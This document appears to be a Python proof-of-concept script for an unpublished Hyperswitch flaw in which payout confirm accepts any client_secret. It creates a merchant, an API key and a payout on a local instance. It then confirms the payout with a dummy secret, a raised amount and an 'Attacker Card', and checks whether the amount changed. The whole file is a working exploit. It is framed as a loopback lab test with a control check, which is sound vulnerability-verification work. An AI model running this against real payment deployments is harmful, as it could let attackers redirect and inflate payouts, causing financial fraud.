#!/usr/bin/env python3
"""Local oracle for Hyperswitch unpublished #2: payout confirm ignores client_secret.

POST /payouts/{id}/confirm with api-key pk_ only requires client_secret present,
not equal to payouts.client_secret. Body is PayoutCreateRequest so amount is applied.

Witness: retrieve payout amount is the raised value. Dummy secret. Loopback only.
Not a shell. Payments confirm is the control (must match secret).
"""
from __future__ import annotations

import json
import sys
import urllib.error
import urllib.request
import uuid
from dataclasses import dataclass
from typing import Any

DEFAULT_HOST = "127.0.0.1"
DEFAULT_PORT = 18083
DEFAULT_BASE = f"http://{DEFAULT_HOST}:{DEFAULT_PORT}"
ADMIN_API_KEY = "test_admin"
ORIG_AMOUNT = 1000
RAISED_AMOUNT = 99900
DUMMY_SECRET = "payout_not_the_real_client_secret"
USER_AGENT = "hs-payout-secret-lab"
HTTP_TIMEOUT_S = 60
API_KEY_EXPIRATION = "2069-09-23T01:02:03.000Z"

PATH_HEALTH = "/health"
PATH_ACCOUNTS = "/accounts"
PATH_PAYMENTS = "/payments"
PATH_PAYOUTS_CREATE = "/payouts/create"


@dataclass(frozen=True)
class LabConfig:
    base: str
    admin_key: str
    merchant_id: str
    orig_amount: int
    raised_amount: int
    dummy_secret: str


def fail(reason: str) -> int:
    print(f"FAIL {reason}")
    return 1


def _snip(payload: object, limit: int) -> str:
    if isinstance(payload, str):
        return repr(payload[:limit])
    return json.dumps(payload)[:limit]


class RouterClient:
    def __init__(self, base: str, timeout_s: int = HTTP_TIMEOUT_S) -> None:
        self.base = base.rstrip("/")
        self.timeout_s = timeout_s

    def request(
        self,
        method: str,
        path: str,
        *,
        body: dict[str, Any] | None = None,
        headers: dict[str, str] | None = None,
    ) -> tuple[int, str]:
        url = path if path.startswith("http") else f"{self.base}{path}"
        hdrs = {"User-Agent": USER_AGENT}
        if headers:
            hdrs.update(headers)
        data: bytes | None = None
        if body is not None:
            data = json.dumps(body).encode("utf-8")
            hdrs.setdefault("Content-Type", "application/json")
        req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
        try:
            with urllib.request.urlopen(req, timeout=self.timeout_s) as resp:
                return resp.status, resp.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as exc:
            return exc.code, exc.read().decode("utf-8", "replace")
        except urllib.error.URLError as exc:
            return 0, str(exc.reason)
        except TimeoutError as exc:
            return 0, str(exc)

    def json(
        self,
        method: str,
        path: str,
        body: dict[str, Any] | None = None,
        headers: dict[str, str] | None = None,
    ) -> tuple[int, dict[str, Any] | str]:
        code, text = self.request(method, path, body=body, headers=headers)
        try:
            loaded: Any = json.loads(text)
        except json.JSONDecodeError:
            return code, text
        if isinstance(loaded, dict):
            return code, loaded
        return code, text if not isinstance(loaded, str) else loaded


def _merchant_create_body(merchant_id: str) -> dict[str, Any]:
    return {
        "merchant_id": merchant_id,
        "merchant_name": "Lab Payout Merchant",
        "merchant_details": {
            "primary_contact_person": "Lab",
            "primary_email": "lab@localhost.invalid",
        },
        "return_url": "https://127.0.0.1/success",
    }


def _payout_connector_body() -> dict[str, Any]:
    return {
        "connector_type": "payout_processor",
        "connector_name": "worldpayxml",
        "connector_account_details": {
            "auth_type": "SignatureKey",
            "api_secret": "LABMERCH",
            "api_key": "lab_user",
            "key1": "lab_pass",
        },
        "test_mode": True,
        "disabled": False,
        "payment_methods_enabled": [
            {
                "payment_method": "card",
                "payment_method_types": [
                    {
                        "payment_method_type": "credit",
                        "card_networks": ["Visa"],
                        "minimum_amount": 1,
                        "maximum_amount": 68607706,
                        "recurring_enabled": True,
                        "installment_payment_enabled": True,
                    }
                ],
            }
        ],
    }


def _card_method(*, holder: str) -> dict[str, Any]:
    return {
        "card": {
            "card_number": "4111111111111111",
            "expiry_month": "03",
            "expiry_year": "2030",
            "card_holder_name": holder,
        }
    }


def _payout_create_body(amount: int) -> dict[str, Any]:
    return {
        "amount": amount,
        "currency": "USD",
        "confirm": False,
        "auto_fulfill": False,
        "payout_type": "card",
        "description": "lab payout confirm secret",
        "payout_method_data": _card_method(holder="Lab Card"),
        "billing": {
            "address": {
                "line1": "1 Lab",
                "city": "Lab",
                "state": "CA",
                "zip": "94107",
                "country": "US",
                "first_name": "Lab",
                "last_name": "User",
            }
        },
        "customer": {
            "email": "payout-lab@localhost.invalid",
            "name": "Lab Payout",
        },
    }


def _payout_confirm_body(dummy_secret: str, amount: int) -> dict[str, Any]:
    return {
        "client_secret": dummy_secret,
        "amount": amount,
        "currency": "USD",
        "auto_fulfill": True,
        "payout_type": "card",
        "payout_method_data": _card_method(holder="Attacker Card"),
    }


def _config_from_argv(argv: list[str]) -> LabConfig:
    base = (argv[0] if argv else DEFAULT_BASE).rstrip("/")
    return LabConfig(
        base=base,
        admin_key=ADMIN_API_KEY,
        merchant_id=f"hs_po_{uuid.uuid4().hex[:8]}",
        orig_amount=ORIG_AMOUNT,
        raised_amount=RAISED_AMOUNT,
        dummy_secret=DUMMY_SECRET,
    )


def main(argv: list[str] | None = None) -> int:
    cfg = _config_from_argv(sys.argv[1:] if argv is None else argv)
    client = RouterClient(cfg.base)
    admin = {"api-key": cfg.admin_key}

    print(f"IOC base={cfg.base} merchant_id={cfg.merchant_id}")
    status, body = client.request("GET", PATH_HEALTH)
    print(f"IOC health status={status} body={body!r}"[:180])

    status, acct = client.json("POST", PATH_ACCOUNTS, _merchant_create_body(cfg.merchant_id), admin)
    print(f"IOC accounts status={status} snippet={_snip(acct, 240)}")
    if status >= 300 or not isinstance(acct, dict):
        return fail("create merchant")
    merchant_id = str(acct.get("merchant_id") or cfg.merchant_id)
    pk = acct.get("publishable_key")
    print(f"IOC merchant_id={merchant_id} pk={str(pk)[:20]}…")

    status, key = client.json(
        "POST",
        f"/api_keys/{merchant_id}",
        {"name": "lab", "expiration": API_KEY_EXPIRATION},
        admin,
    )
    if status >= 300 or not isinstance(key, dict) or not key.get("api_key"):
        return fail(f"create api key {key}")
    api_key = str(key["api_key"])
    auth = {"api-key": api_key}
    if not pk:
        pk = acct.get("publishable_key")
    print(f"IOC api_key_len={len(api_key)}")

    status, connector = client.json(
        "POST",
        f"/account/{merchant_id}/connectors",
        _payout_connector_body(),
        auth,
    )
    print(f"IOC payout MCA status={status} snippet={_snip(connector, 240)}")

    status, payout = client.json(
        "POST",
        PATH_PAYOUTS_CREATE,
        _payout_create_body(cfg.orig_amount),
        auth,
    )
    print(f"IOC payouts.create status={status} snippet={_snip(payout, 400)}")
    if status >= 300 or not isinstance(payout, dict) or not payout.get("payout_id"):
        return fail("create payout")
    payout_id = str(payout["payout_id"])
    real_secret = payout.get("client_secret")
    before_amt = payout.get("amount")
    before_status = payout.get("status")
    print(
        f"IOC payout_id={payout_id} amount={before_amt} status={before_status} "
        f"secret_prefix={str(real_secret)[:24]}"
    )
    if before_amt != cfg.orig_amount:
        return fail(f"unexpected create amount {before_amt}")

    pay_status, payment = client.json(
        "POST",
        PATH_PAYMENTS,
        {
            "amount": 100,
            "currency": "USD",
            "confirm": False,
            "description": "control payment",
        },
        auth,
    )
    if isinstance(payment, dict) and payment.get("payment_id") and payment.get("client_secret"):
        pk_headers = {"api-key": str(pk)}
        confirm_status, control = client.json(
            "POST",
            f"/payments/{payment['payment_id']}/confirm",
            {"client_secret": cfg.dummy_secret},
            pk_headers,
        )
        print(
            f"IOC payments.confirm dummy-secret status={confirm_status} "
            f"snippet={_snip(control, 200)}"
        )
        if confirm_status == 200:
            return fail("payments confirm accepted dummy client_secret (control broken)")
    else:
        print(f"IOC skip payments control create_status={pay_status}")

    pk_headers = {"api-key": str(pk)}
    status, conf = client.json(
        "POST",
        f"/payouts/{payout_id}/confirm",
        _payout_confirm_body(cfg.dummy_secret, cfg.raised_amount),
        pk_headers,
    )
    print(f"IOC payouts.confirm status={status} snippet={_snip(conf, 500)}")

    retrieve_status, got = client.json("GET", f"/payouts/{payout_id}", headers=auth)
    print(f"IOC payouts.retrieve status={retrieve_status} snippet={_snip(got, 400)}")
    if not isinstance(got, dict):
        return fail("retrieve payout")
    after_amt = got.get("amount")
    after_status = got.get("status")
    print(f"IOC after amount={after_amt} status={after_status}")

    conf_text = json.dumps(conf).lower() if isinstance(conf, dict) else ""
    if status in {401, 403} or (
        "client_secret" in conf_text
        and "invalid" in conf_text
        and after_amt == cfg.orig_amount
    ):
        return fail("confirm rejected dummy client_secret (bound)")
    if after_amt == cfg.raised_amount:
        print("SUCCESS Hyperswitch payout confirm unbound client_secret amount raise")
        return 0
    if status == 200 and after_amt != cfg.orig_amount:
        print(f"SUCCESS amount changed to {after_amt} with dummy client_secret")
        return 0
    return fail("amount not raised")


if __name__ == "__main__":
    raise SystemExit(main())
